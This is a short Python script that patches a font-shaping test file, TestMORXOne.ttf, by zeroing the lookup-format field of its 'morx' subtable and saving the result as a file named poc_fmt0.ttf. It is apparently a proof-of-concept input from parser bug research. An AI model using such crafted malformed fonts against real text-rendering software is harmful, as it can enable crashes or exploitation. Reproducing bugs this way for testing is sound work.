import struct
p='test/shaping/data/text-rendering-tests/fonts/TestMORXOne.ttf'
data=bytearray(open(p,'rb').read())
num=struct.unpack('>H',data[4:6])[0]
ts={}
for i in range(num):
    off=12+16*i
    tag=data[off:off+4].decode('latin1'); chk,ofs,ln=struct.unpack('>III',data[off+4:off+16]); ts[tag]=(ofs,ln)
mo,ml=ts['morx']; m=data[mo:mo+ml]
# in TestMORXOne first subtable position relative morx 48, lookup format at +12
fmt_off=mo+48+12
print('old', data[fmt_off:fmt_off+2].hex(), 'maxp num', struct.unpack('>H', data[ts['maxp'][0]+4:ts['maxp'][0]+6])[0], 'morx', mo, ml)
data[fmt_off:fmt_off+2]=b'\x00\x00'
open('/workspace/poc_fmt0.ttf','wb').write(data)
print('wrote', len(data), data[fmt_off:fmt_off+8].hex())
